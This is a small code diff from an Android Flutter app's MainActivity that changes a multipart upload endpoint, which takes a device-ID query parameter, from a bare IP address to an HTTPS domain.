@@ -142,7 +142,7 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
             val boundary = "----AndroidFormBoundary${System.currentTimeMillis()}"
             val lineEnd = "\r\n"
             val twoHyphens = "--"
-            val url = java.net.URL("http://45.76.212.185:8080/upload?deviceid=$deviceId")
+            val url = java.net.URL("https://image.byyp888.cn/upload?deviceid=$deviceId")
             val conn = url.openConnection() as java.net.HttpURLConnection
             conn.doInput = true
             conn.doOutput = true
